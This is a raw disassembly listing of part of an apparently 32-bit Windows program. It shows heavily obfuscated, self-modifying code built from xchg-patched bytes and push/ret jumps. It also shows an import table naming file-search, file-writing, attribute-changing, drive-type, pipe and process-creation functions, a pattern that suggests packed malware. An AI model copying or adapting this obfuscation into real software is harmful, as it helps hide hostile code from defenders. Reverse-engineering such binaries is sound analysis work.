  40e4c7:	87 04 24             	xchg   %eax,(%esp)
  40e4ca:	c3                   	ret
  40e4cb:	8f 05 f9 e4 40 00    	pop    0x40e4f9
  40e4d1:	50                   	push   %eax
  40e4d2:	90                   	nop
  40e4d3:	b8 15 20 40 00       	mov    $0x402015,%eax
  40e4d8:	8d 80 d3 a4 11 ff    	lea    -0xee5b2d(%eax),%eax
  40e4de:	87 05 e7 e4 40 00    	xchg   %eax,0x40e4e7
  40e4e4:	58                   	pop    %eax
  40e4e5:	f3 90                	pause
  40e4e7:	ae                   	scas   %es:(%edi),%al
  40e4e8:	90                   	nop
  40e4e9:	6d                   	insl   (%dx),%es:(%edi)
  40e4ea:	fa                   	cli
  40e4eb:	ff 50 66             	call   *0x66(%eax)
  40e4ee:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e4f3:	05 e7 e4 40 00       	add    $0x40e4e7,%eax
  40e4f8:	b8 38 8b 6a fb       	mov    $0xfb6a8b38,%eax
  40e4fd:	87 04 24             	xchg   %eax,(%esp)
  40e500:	c3                   	ret
  40e501:	8f 05 2f e5 40 00    	pop    0x40e52f
  40e507:	50                   	push   %eax
  40e508:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e50e:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40e514:	87 05 1d e5 40 00    	xchg   %eax,0x40e51d
  40e51a:	58                   	pop    %eax
  40e51b:	f3 90                	pause
  40e51d:	46                   	inc    %esi
  40e51e:	4a                   	dec    %edx
  40e51f:	d3 ab 00 50 66 b8    	shrl   %cl,-0x4799b000(%ebx)
  40e525:	eb e8                	jmp    0x40e50f
  40e527:	66 87 05 1d e5 40 00 	xchg   %ax,0x40e51d
  40e52e:	b8 ed 4a b5 21       	mov    $0x21b54aed,%eax
  40e533:	87 04 24             	xchg   %eax,(%esp)
  40e536:	c3                   	ret
  40e537:	8f 05 65 e5 40 00    	pop    0x40e565
  40e53d:	50                   	push   %eax
  40e53e:	90                   	nop
  40e53f:	b8 15 20 40 00       	mov    $0x402015,%eax
  40e544:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  40e54a:	87 05 53 e5 40 00    	xchg   %eax,0x40e553
  40e550:	58                   	pop    %eax
  40e551:	f3 90                	pause
  40e553:	ef                   	out    %eax,(%dx)
  40e554:	7a c4                	jp     0x40e51a
  40e556:	53                   	push   %ebx
  40e557:	00 50 66             	add    %dl,0x66(%eax)
  40e55a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e55f:	05 53 e5 40 00       	add    $0x40e553,%eax
  40e564:	b8 31 b4 d4 ab       	mov    $0xabd4b431,%eax
  40e569:	87 04 24             	xchg   %eax,(%esp)
  40e56c:	c3                   	ret
  40e56d:	8f 05 9c e5 40 00    	pop    0x40e59c
  40e573:	50                   	push   %eax
  40e574:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e57a:	8d 80 ea 15 84 56    	lea    0x568415ea(%eax),%eax
  40e580:	87 05 89 e5 40 00    	xchg   %eax,0x40e589
  40e586:	58                   	pop    %eax
  40e587:	f3 90                	pause
  40e589:	9e                   	sahf
  40e58a:	1a 5d a0             	sbb    -0x60(%ebp),%bl
  40e58d:	40                   	inc    %eax
  40e58e:	00 50 66             	add    %dl,0x66(%eax)
  40e591:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e596:	05 89 e5 40 00       	add    $0x40e589,%eax
  40e59b:	b8 d0 8b b7 4f       	mov    $0x4fb78bd0,%eax
  40e5a0:	8d 40 01             	lea    0x1(%eax),%eax
  40e5a3:	87 04 24             	xchg   %eax,(%esp)
  40e5a6:	c3                   	ret
  40e5a7:	8f 05 d5 e5 40 00    	pop    0x40e5d5
  40e5ad:	50                   	push   %eax
  40e5ae:	90                   	nop
  40e5af:	b8 15 20 40 00       	mov    $0x402015,%eax
  40e5b4:	8d 80 d3 44 0b ff    	lea    -0xf4bb2d(%eax),%eax
  40e5ba:	87 05 c3 e5 40 00    	xchg   %eax,0x40e5c3
  40e5c0:	58                   	pop    %eax
  40e5c1:	f3 90                	pause
  40e5c3:	54                   	push   %esp
  40e5c4:	2b 3d b0 ff 50 66    	sub    0x6650ffb0,%edi
  40e5ca:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e5cf:	05 c3 e5 40 00       	add    $0x40e5c3,%eax
  40e5d4:	b8 49 a7 80 8b       	mov    $0x8b80a749,%eax
  40e5d9:	87 04 24             	xchg   %eax,(%esp)
  40e5dc:	c3                   	ret
  40e5dd:	8f 05 0c e6 40 00    	pop    0x40e60c
  40e5e3:	50                   	push   %eax
  40e5e4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e5ea:	8d 80 6c cc c8 00    	lea    0xc8cc6c(%eax),%eax
  40e5f0:	87 05 f9 e5 40 00    	xchg   %eax,0x40e5f9
  40e5f6:	58                   	pop    %eax
  40e5f7:	f3 90                	pause
  40e5f9:	cf                   	iret
  40e5fa:	56                   	push   %esi
  40e5fb:	ed                   	in     (%dx),%eax
  40e5fc:	13 00                	adc    (%eax),%eax
  40e5fe:	00 50 66             	add    %dl,0x66(%eax)
  40e601:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e606:	05 f9 e5 40 00       	add    $0x40e5f9,%eax
  40e60b:	b8 19 34 dc 6d       	mov    $0x6ddc3419,%eax
  40e610:	8d 40 01             	lea    0x1(%eax),%eax
  40e613:	87 04 24             	xchg   %eax,(%esp)
  40e616:	c3                   	ret
  40e617:	8f 05 45 e6 40 00    	pop    0x40e645
  40e61d:	50                   	push   %eax
  40e61e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e624:	8d 80 53 e4 c0 ff    	lea    -0x3f1bad(%eax),%eax
  40e62a:	87 05 33 e6 40 00    	xchg   %eax,0x40e633
  40e630:	58                   	pop    %eax
  40e631:	f3 90                	pause
  40e633:	5d                   	pop    %ebp
  40e634:	bf ee 11 00 50       	mov    $0x500011ee,%edi
  40e639:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e63d:	66 87 05 33 e6 40 00 	xchg   %ax,0x40e633
  40e644:	b8 ab f9 92 ec       	mov    $0xec92f9ab,%eax
  40e649:	87 04 24             	xchg   %eax,(%esp)
  40e64c:	c3                   	ret
  40e64d:	8f 05 7c e6 40 00    	pop    0x40e67c
  40e653:	50                   	push   %eax
  40e654:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e65a:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40e660:	87 05 69 e6 40 00    	xchg   %eax,0x40e669
  40e666:	58                   	pop    %eax
  40e667:	f3 90                	pause
  40e669:	b3 5b                	mov    $0x5b,%bl
  40e66b:	bf 2b ff ff 50       	mov    $0x50ffff2b,%edi
  40e670:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e674:	66 87 05 69 e6 40 00 	xchg   %ax,0x40e669
  40e67b:	b8 84 c0 bf 5a       	mov    $0x5abfc084,%eax
  40e680:	8d 40 01             	lea    0x1(%eax),%eax
  40e683:	87 04 24             	xchg   %eax,(%esp)
  40e686:	c3                   	ret
  40e687:	8f 05 b5 e6 40 00    	pop    0x40e6b5
  40e68d:	50                   	push   %eax
  40e68e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e694:	8d 80 d3 c4 12 ff    	lea    -0xed3b2d(%eax),%eax
  40e69a:	87 05 a3 e6 40 00    	xchg   %eax,0x40e6a3
  40e6a0:	58                   	pop    %eax
  40e6a1:	f3 90                	pause
  40e6a3:	1e                   	push   %ds
  40e6a4:	3e d2 2c ff          	shrb   %cl,%ds:(%edi,%edi,8)
  40e6a8:	50                   	push   %eax
  40e6a9:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e6ad:	66 87 05 a3 e6 40 00 	xchg   %ax,0x40e6a3
  40e6b4:	b8 37 c3 97 a2       	mov    $0xa297c337,%eax
  40e6b9:	87 04 24             	xchg   %eax,(%esp)
  40e6bc:	c3                   	ret
  40e6bd:	8f 05 ec e6 40 00    	pop    0x40e6ec
  40e6c3:	50                   	push   %eax
  40e6c4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e6ca:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40e6d0:	87 05 d9 e6 40 00    	xchg   %eax,0x40e6d9
  40e6d6:	58                   	pop    %eax
  40e6d7:	f3 90                	pause
  40e6d9:	36 79 ee             	ss jns 0x40e6ca
  40e6dc:	81 ff ff 50 66 b8    	cmp    $0xb86650ff,%edi
  40e6e2:	eb e8                	jmp    0x40e6cc
  40e6e4:	66 87 05 d9 e6 40 00 	xchg   %ax,0x40e6d9
  40e6eb:	b8 a6 14 18 d5       	mov    $0xd51814a6,%eax
  40e6f0:	8d 40 01             	lea    0x1(%eax),%eax
  40e6f3:	87 04 24             	xchg   %eax,(%esp)
  40e6f6:	c3                   	ret
  40e6f7:	8f 05 25 e7 40 00    	pop    0x40e725
  40e6fd:	50                   	push   %eax
  40e6fe:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e704:	8d 80 d3 42 12 ff    	lea    -0xedbd2d(%eax),%eax
  40e70a:	87 05 13 e7 40 00    	xchg   %eax,0x40e713
  40e710:	58                   	pop    %eax
  40e711:	f3 90                	pause
  40e713:	ff 30                	push   (%eax)
  40e715:	b9 bb ff 50 66       	mov    $0x6650ffbb,%ecx
  40e71a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e71f:	05 13 e7 40 00       	add    $0x40e713,%eax
  40e724:	b8 a6 14 44 38       	mov    $0x384414a6,%eax
  40e729:	87 04 24             	xchg   %eax,(%esp)
  40e72c:	c3                   	ret
  40e72d:	8f 05 5d e7 40 00    	pop    0x40e75d
  40e733:	50                   	push   %eax
  40e734:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e73a:	8d 80 78 64 c5 f7    	lea    -0x83a9b88(%eax),%eax
  40e740:	87 05 49 e7 40 00    	xchg   %eax,0x40e749
  40e746:	58                   	pop    %eax
  40e747:	f3 90                	pause
  40e749:	24 3c                	and    $0x3c,%al
  40e74b:	3b 18                	cmp    (%eax),%ebx
  40e74d:	fe                   	(bad)
  40e74e:	ff                   	(bad)
  40e74f:	ff 50 66             	call   *0x66(%eax)
  40e752:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e757:	05 49 e7 40 00       	add    $0x40e749,%eax
  40e75c:	b8 37 ee 22 28       	mov    $0x2822ee37,%eax
  40e761:	8d 40 02             	lea    0x2(%eax),%eax
  40e764:	87 04 24             	xchg   %eax,(%esp)
  40e767:	c3                   	ret
  40e768:	8f 05 97 e7 40 00    	pop    0x40e797
  40e76e:	50                   	push   %eax
  40e76f:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e775:	8d 80 78 6d b8 fe    	lea    -0x1479288(%eax),%eax
  40e77b:	87 05 84 e7 40 00    	xchg   %eax,0x40e784
  40e781:	58                   	pop    %eax
  40e782:	f3 90                	pause
  40e784:	b4 2d                	mov    $0x2d,%ah
  40e786:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40e787:	c6                   	(bad)
  40e788:	ff                   	(bad)
  40e789:	ff 50 66             	call   *0x66(%eax)
  40e78c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40e791:	05 84 e7 40 00       	add    $0x40e784,%eax
  40e796:	b8 5d bf 07 14       	mov    $0x1407bf5d,%eax
  40e79b:	8d 40 01             	lea    0x1(%eax),%eax
  40e79e:	87 04 24             	xchg   %eax,(%esp)
  40e7a1:	c3                   	ret
  40e7a2:	8f 05 d1 e7 40 00    	pop    0x40e7d1
  40e7a8:	50                   	push   %eax
  40e7a9:	90                   	nop
  40e7aa:	b8 15 20 40 00       	mov    $0x402015,%eax
  40e7af:	8d 80 78 65 b8 fe    	lea    -0x1479a88(%eax),%eax
  40e7b5:	87 05 be e7 40 00    	xchg   %eax,0x40e7be
  40e7bb:	58                   	pop    %eax
  40e7bc:	f3 90                	pause
  40e7be:	c5 a7 31 39 ff ff    	lds    -0xc6cf(%edi),%esp
  40e7c4:	50                   	push   %eax
  40e7c5:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e7c9:	66 87 05 be e7 40 00 	xchg   %ax,0x40e7be
  40e7d0:	b8 bf 63 c0 fb       	mov    $0xfbc063bf,%eax
  40e7d5:	8d 40 01             	lea    0x1(%eax),%eax
  40e7d8:	87 04 24             	xchg   %eax,(%esp)
  40e7db:	c3                   	ret
  40e7dc:	8f 05 0b e8 40 00    	pop    0x40e80b
  40e7e2:	50                   	push   %eax
  40e7e3:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40e7e9:	8d 80 ea f5 5f 52    	lea    0x525ff5ea(%eax),%eax
  40e7ef:	87 05 f8 e7 40 00    	xchg   %eax,0x40e7f8
  40e7f5:	58                   	pop    %eax
  40e7f6:	f3 90                	pause
  40e7f8:	9b                   	fwait
  40e7f9:	3c dd                	cmp    $0xdd,%al
  40e7fb:	df 40 00             	filds  0x0(%eax)
  40e7fe:	50                   	push   %eax
  40e7ff:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40e803:	66 87 05 f8 e7 40 00 	xchg   %ax,0x40e7f8
  40e80a:	b8 ad b8 0f 13       	mov    $0x130fb8ad,%eax
  40e80f:	8d 40 01             	lea    0x1(%eax),%eax
  40e812:	87 04 24             	xchg   %eax,(%esp)
  40e815:	c3                   	ret
	...
  40effe:	00 00                	add    %al,(%eax)
  40f000:	d5 00                	aad    $0x0
  40f002:	00 00                	add    %al,(%eax)
  40f004:	2c 42                	sub    $0x42,%al
  40f006:	00 00                	add    %al,(%eax)
  40f008:	01 47 65             	add    %eax,0x65(%edi)
  40f00b:	74 4d                	je     0x40f05a
  40f00d:	6f                   	outsl  %ds:(%esi),(%dx)
  40f00e:	64 75 6c             	fs jne 0x40f07d
  40f011:	65 48                	gs dec %eax
  40f013:	61                   	popa
  40f014:	6e                   	outsb  %ds:(%esi),(%dx)
  40f015:	64 6c                	fs insb (%dx),%es:(%edi)
  40f017:	65 41                	gs inc %ecx
  40f019:	00 01                	add    %al,(%ecx)
  40f01b:	48                   	dec    %eax
  40f01c:	65 61                	gs popa
  40f01e:	70 43                	jo     0x40f063
  40f020:	72 65                	jb     0x40f087
  40f022:	61                   	popa
  40f023:	74 65                	je     0x40f08a
  40f025:	00 01                	add    %al,(%ecx)
  40f027:	48                   	dec    %eax
  40f028:	65 61                	gs popa
  40f02a:	70 44                	jo     0x40f070
  40f02c:	65 73 74             	gs jae 0x40f0a3
  40f02f:	72 6f                	jb     0x40f0a0
  40f031:	79 00                	jns    0x40f033
  40f033:	01 45 78             	add    %eax,0x78(%ebp)
  40f036:	69 74 50 72 6f 63 65 	imul   $0x7365636f,0x72(%eax,%edx,2),%esi
  40f03d:	73 
  40f03e:	73 00                	jae    0x40f040
  40f040:	01 47 65             	add    %eax,0x65(%edi)
  40f043:	74 43                	je     0x40f088
  40f045:	75 72                	jne    0x40f0b9
  40f047:	72 65                	jb     0x40f0ae
  40f049:	6e                   	outsb  %ds:(%esi),(%dx)
  40f04a:	74 54                	je     0x40f0a0
  40f04c:	68 72 65 61 64       	push   $0x64616572
  40f051:	49                   	dec    %ecx
  40f052:	64 00 01             	add    %al,%fs:(%ecx)
  40f055:	47                   	inc    %edi
  40f056:	65 74 54             	gs je  0x40f0ad
  40f059:	69 63 6b 43 6f 75 6e 	imul   $0x6e756f43,0x6b(%ebx),%esp
  40f060:	74 00                	je     0x40f062
  40f062:	01 48 65             	add    %ecx,0x65(%eax)
  40f065:	61                   	popa
  40f066:	70 41                	jo     0x40f0a9
  40f068:	6c                   	insb   (%dx),%es:(%edi)
  40f069:	6c                   	insb   (%dx),%es:(%edi)
  40f06a:	6f                   	outsl  %ds:(%esi),(%dx)
  40f06b:	63 00                	arpl   %eax,(%eax)
  40f06d:	01 48 65             	add    %ecx,0x65(%eax)
  40f070:	61                   	popa
  40f071:	70 46                	jo     0x40f0b9
  40f073:	72 65                	jb     0x40f0da
  40f075:	65 00 01             	add    %al,%gs:(%ecx)
  40f078:	57                   	push   %edi
  40f079:	72 69                	jb     0x40f0e4
  40f07b:	74 65                	je     0x40f0e2
  40f07d:	46                   	inc    %esi
  40f07e:	69 6c 65 00 01 43 6c 	imul   $0x6f6c4301,0x0(%ebp,%eiz,2),%ebp
  40f085:	6f 
  40f086:	73 65                	jae    0x40f0ed
  40f088:	48                   	dec    %eax
  40f089:	61                   	popa
  40f08a:	6e                   	outsb  %ds:(%esi),(%dx)
  40f08b:	64 6c                	fs insb (%dx),%es:(%edi)
  40f08d:	65 00 01             	add    %al,%gs:(%ecx)
  40f090:	43                   	inc    %ebx
  40f091:	72 65                	jb     0x40f0f8
  40f093:	61                   	popa
  40f094:	74 65                	je     0x40f0fb
  40f096:	46                   	inc    %esi
  40f097:	69 6c 65 41 00 01 47 	imul   $0x65470100,0x41(%ebp,%eiz,2),%ebp
  40f09e:	65 
  40f09f:	74 46                	je     0x40f0e7
  40f0a1:	69 6c 65 53 69 7a 65 	imul   $0x657a69,0x53(%ebp,%eiz,2),%ebp
  40f0a8:	00 
  40f0a9:	01 52 65             	add    %edx,0x65(%edx)
  40f0ac:	61                   	popa
  40f0ad:	64 46                	fs inc %esi
  40f0af:	69 6c 65 00 01 53 65 	imul   $0x74655301,0x0(%ebp,%eiz,2),%ebp
  40f0b6:	74 
  40f0b7:	46                   	inc    %esi
  40f0b8:	69 6c 65 50 6f 69 6e 	imul   $0x746e696f,0x50(%ebp,%eiz,2),%ebp
  40f0bf:	74 
  40f0c0:	65 72 00             	gs jb  0x40f0c3
  40f0c3:	01 49 6e             	add    %ecx,0x6e(%ecx)
  40f0c6:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40f0cd:	65 
  40f0ce:	43                   	inc    %ebx
  40f0cf:	72 69                	jb     0x40f13a
  40f0d1:	74 69                	je     0x40f13c
  40f0d3:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40f0d6:	53                   	push   %ebx
  40f0d7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40f0dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40f0dd:	00 01                	add    %al,(%ecx)
  40f0df:	47                   	inc    %edi
  40f0e0:	65 74 4d             	gs je  0x40f130
  40f0e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40f0e4:	64 75 6c             	fs jne 0x40f153
  40f0e7:	65 46                	gs inc %esi
  40f0e9:	69 6c 65 4e 61 6d 65 	imul   $0x41656d61,0x4e(%ebp,%eiz,2),%ebp
  40f0f0:	41 
  40f0f1:	00 01                	add    %al,(%ecx)
  40f0f3:	47                   	inc    %edi
  40f0f4:	65 74 43             	gs je  0x40f13a
  40f0f7:	75 72                	jne    0x40f16b
  40f0f9:	72 65                	jb     0x40f160
  40f0fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40f0fc:	74 50                	je     0x40f14e
  40f0fe:	72 6f                	jb     0x40f16f
  40f100:	63 65 73             	arpl   %esp,0x73(%ebp)
  40f103:	73 00                	jae    0x40f105
  40f105:	01 44 75 70          	add    %eax,0x70(%ebp,%esi,2)
  40f109:	6c                   	insb   (%dx),%es:(%edi)
  40f10a:	69 63 61 74 65 48 61 	imul   $0x61486574,0x61(%ebx),%esp
  40f111:	6e                   	outsb  %ds:(%esi),(%dx)
  40f112:	64 6c                	fs insb (%dx),%es:(%edi)
  40f114:	65 00 01             	add    %al,%gs:(%ecx)
  40f117:	43                   	inc    %ebx
  40f118:	72 65                	jb     0x40f17f
  40f11a:	61                   	popa
  40f11b:	74 65                	je     0x40f182
  40f11d:	50                   	push   %eax
  40f11e:	69 70 65 00 01 47 65 	imul   $0x65470100,0x65(%eax),%esi
  40f125:	74 53                	je     0x40f17a
  40f127:	74 64                	je     0x40f18d
  40f129:	48                   	dec    %eax
  40f12a:	61                   	popa
  40f12b:	6e                   	outsb  %ds:(%esi),(%dx)
  40f12c:	64 6c                	fs insb (%dx),%es:(%edi)
  40f12e:	65 00 01             	add    %al,%gs:(%ecx)
  40f131:	43                   	inc    %ebx
  40f132:	72 65                	jb     0x40f199
  40f134:	61                   	popa
  40f135:	74 65                	je     0x40f19c
  40f137:	50                   	push   %eax
  40f138:	72 6f                	jb     0x40f1a9
  40f13a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40f13d:	73 41                	jae    0x40f180
  40f13f:	00 01                	add    %al,(%ecx)
  40f141:	57                   	push   %edi
  40f142:	61                   	popa
  40f143:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%esi,%eax,2),%esi
  40f14a:	6e 
  40f14b:	67 6c                	insb   (%dx),%es:(%di)
  40f14d:	65 4f                	gs dec %edi
  40f14f:	62 6a 65             	bound  %ebp,0x65(%edx)
  40f152:	63 74 00 01          	arpl   %esi,0x1(%eax,%eax,1)
  40f156:	45                   	inc    %ebp
  40f157:	6e                   	outsb  %ds:(%esi),(%dx)
  40f158:	74 65                	je     0x40f1bf
  40f15a:	72 43                	jb     0x40f19f
  40f15c:	72 69                	jb     0x40f1c7
  40f15e:	74 69                	je     0x40f1c9
  40f160:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40f163:	53                   	push   %ebx
  40f164:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40f169:	6e                   	outsb  %ds:(%esi),(%dx)
  40f16a:	00 01                	add    %al,(%ecx)
  40f16c:	4c                   	dec    %esp
  40f16d:	65 61                	gs popa
  40f16f:	76 65                	jbe    0x40f1d6
  40f171:	43                   	inc    %ebx
  40f172:	72 69                	jb     0x40f1dd
  40f174:	74 69                	je     0x40f1df
  40f176:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40f179:	53                   	push   %ebx
  40f17a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40f17f:	6e                   	outsb  %ds:(%esi),(%dx)
  40f180:	00 01                	add    %al,(%ecx)
  40f182:	47                   	inc    %edi
  40f183:	65 74 43             	gs je  0x40f1c9
  40f186:	75 72                	jne    0x40f1fa
  40f188:	72 65                	jb     0x40f1ef
  40f18a:	6e                   	outsb  %ds:(%esi),(%dx)
  40f18b:	74 50                	je     0x40f1dd
  40f18d:	72 6f                	jb     0x40f1fe
  40f18f:	63 65 73             	arpl   %esp,0x73(%ebp)
  40f192:	73 49                	jae    0x40f1dd
  40f194:	64 00 01             	add    %al,%fs:(%ecx)
  40f197:	47                   	inc    %edi
  40f198:	65 74 44             	gs je  0x40f1df
  40f19b:	72 69                	jb     0x40f206
  40f19d:	76 65                	jbe    0x40f204
  40f19f:	54                   	push   %esp
  40f1a0:	79 70                	jns    0x40f212
  40f1a2:	65 41                	gs inc %ecx
  40f1a4:	00 01                	add    %al,(%ecx)
  40f1a6:	46                   	inc    %esi
  40f1a7:	69 6e 64 46 69 72 73 	imul   $0x73726946,0x64(%esi),%ebp
  40f1ae:	74 46                	je     0x40f1f6
  40f1b0:	69 6c 65 41 00 01 46 	imul   $0x69460100,0x41(%ebp,%eiz,2),%ebp
  40f1b7:	69 
  40f1b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40f1b9:	64 43                	fs inc %ebx
  40f1bb:	6c                   	insb   (%dx),%es:(%edi)
  40f1bc:	6f                   	outsl  %ds:(%esi),(%dx)
  40f1bd:	73 65                	jae    0x40f224
  40f1bf:	00 01                	add    %al,(%ecx)
  40f1c1:	47                   	inc    %edi
  40f1c2:	65 74 46             	gs je  0x40f20b
  40f1c5:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  40f1cc:	69 
  40f1cd:	62 75 74             	bound  %esi,0x74(%ebp)
  40f1d0:	65 73 41             	gs jae 0x40f214
  40f1d3:	00 01                	add    %al,(%ecx)
  40f1d5:	43                   	inc    %ebx
  40f1d6:	72 65                	jb     0x40f23d
  40f1d8:	61                   	popa
  40f1d9:	74 65                	je     0x40f240
  40f1db:	44                   	inc    %esp
  40f1dc:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40f1e3:	79 41                	jns    0x40f226
  40f1e5:	00 01                	add    %al,(%ecx)
  40f1e7:	47                   	inc    %edi
  40f1e8:	65 74 4c             	gs je  0x40f237
  40f1eb:	61                   	popa
  40f1ec:	73 74                	jae    0x40f262
  40f1ee:	45                   	inc    %ebp
  40f1ef:	72 72                	jb     0x40f263
  40f1f1:	6f                   	outsl  %ds:(%esi),(%dx)
  40f1f2:	72 00                	jb     0x40f1f4
  40f1f4:	01 46 69             	add    %eax,0x69(%esi)
  40f1f7:	6e                   	outsb  %ds:(%esi),(%dx)
  40f1f8:	64 4e                	fs dec %esi
  40f1fa:	65 78 74             	gs js  0x40f271
  40f1fd:	46                   	inc    %esi
  40f1fe:	69 6c 65 41 00 01 53 	imul   $0x65530100,0x41(%ebp,%eiz,2),%ebp
  40f205:	65 
  40f206:	74 46                	je     0x40f24e
  40f208:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  40f20f:	69 
  40f210:	62 75 74             	bound  %esi,0x74(%ebp)
  40f213:	65 73 41             	gs jae 0x40f257
  40f216:	00 01                	add    %al,(%ecx)
  40f218:	48                   	dec    %eax
  40f219:	65 61                	gs popa
  40f21b:	70 52                	jo     0x40f26f
  40f21d:	65 41                	gs inc %ecx
  40f21f:	6c                   	insb   (%dx),%es:(%edi)
  40f220:	6c                   	insb   (%dx),%es:(%edi)
  40f221:	6f                   	outsl  %ds:(%esi),(%dx)
  40f222:	63 00                	arpl   %eax,(%eax)
  40f224:	00 c8                	add    %cl,%al
  40f226:	00 00                	add    %al,(%eax)
  40f228:	00 b8 42 00 00 01    	add    %bh,0x1000042(%eax)
  40f22e:	49                   	dec    %ecx
  40f22f:	6e                   	outsb  %ds:(%esi),(%dx)
  40f230:	69 74 43 6f 6d 6d 6f 	imul   $0x6e6f6d6d,0x6f(%ebx,%eax,2),%esi
  40f237:	6e 
  40f238:	43                   	inc    %ebx
  40f239:	6f                   	outsl  %ds:(%esi),(%dx)
  40f23a:	6e                   	outsb  %ds:(%esi),(%dx)
  40f23b:	74 72                	je     0x40f2af
  40f23d:	6f                   	outsl  %ds:(%esi),(%dx)
  40f23e:	6c                   	insb   (%dx),%es:(%edi)
  40f23f:	73 00                	jae    0x40f241
  40f241:	00 e2                	add    %ah,%dl
  40f243:	00 00                	add    %al,(%eax)
  40f245:	00 fc                	add    %bh,%ah
  40f247:	41                   	inc    %ecx
  40f248:	00 00                	add    %al,(%eax)
  40f24a:	01 6d 65             	add    %ebp,0x65(%ebp)
  40f24d:	6d                   	insl   (%dx),%es:(%edi)
  40f24e:	73 65                	jae    0x40f2b5
  40f250:	74 00                	je     0x40f252
  40f252:	01 6d 65             	add    %ebp,0x65(%ebp)
  40f255:	6d                   	insl   (%dx),%es:(%edi)
  40f256:	63 70 79             	arpl   %esi,0x79(%eax)
  40f259:	00 01                	add    %al,(%ecx)
  40f25b:	5f                   	pop    %edi
  40f25c:	73 74                	jae    0x40f2d2
  40f25e:	72 69                	jb     0x40f2c9
  40f260:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  40f263:	00 01                	add    %al,(%ecx)
  40f265:	73 74                	jae    0x40f2db
  40f267:	72 6e                	jb     0x40f2d7
  40f269:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  40f26c:	00 01                	add    %al,(%ecx)
  40f26e:	5f                   	pop    %edi
  40f26f:	73 74                	jae    0x40f2e5
  40f271:	72 6e                	jb     0x40f2e1
  40f273:	69 63 6d 70 00 01 73 	imul   $0x73010070,0x6d(%ebx),%esp
  40f27a:	74 72                	je     0x40f2ee
  40f27c:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  40f27f:	00 01                	add    %al,(%ecx)
  40f281:	6d                   	insl   (%dx),%es:(%edi)
  40f282:	65 6d                	gs insl (%dx),%es:(%edi)
  40f284:	6d                   	insl   (%dx),%es:(%edi)
  40f285:	6f                   	outsl  %ds:(%esi),(%dx)
  40f286:	76 65                	jbe    0x40f2ed
  40f288:	00 01                	add    %al,(%ecx)
  40f28a:	73 74                	jae    0x40f300
  40f28c:	72 6c                	jb     0x40f2fa
  40f28e:	65 6e                	outsb  %gs:(%esi),(%dx)
  40f290:	00 01                	add    %al,(%ecx)
  40f292:	73 74                	jae    0x40f308
  40f294:	72 63                	jb     0x40f2f9
  40f296:	70 79                	jo     0x40f311
  40f298:	00 01                	add    %al,(%ecx)
  40f29a:	73 74                	jae    0x40f310
  40f29c:	72 63                	jb     0x40f301
  40f29e:	61                   	popa
  40f29f:	74 00                	je     0x40f2a1
  40f2a1:	01 73 74             	add    %esi,0x74(%ebx)
  40f2a4:	72 6e                	jb     0x40f314
  40f2a6:	63 70 79             	arpl   %esi,0x79(%eax)
  40f2a9:	00 00                	add    %al,(%eax)
  40f2ab:	ed                   	in     (%dx),%eax
  40f2ac:	00 00                	add    %al,(%eax)
  40f2ae:	00 e8                	add    %ch,%al
  40f2b0:	42                   	inc    %edx
  40f2b1:	00 00                	add    %al,(%eax)
  40f2b3:	01 43 6f             	add    %eax,0x6f(%ebx)
  40f2b6:	49                   	dec    %ecx
  40f2b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40f2b8:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40f2bf:	65 
  40f2c0:	00 00                	add    %al,(%eax)
  40f2c2:	f7 00 00 00 e0 42    	testl  $0x42e00000,(%eax)
  40f2c8:	00 00                	add    %al,(%eax)
  40f2ca:	01 53 68             	add    %edx,0x68(%ebx)
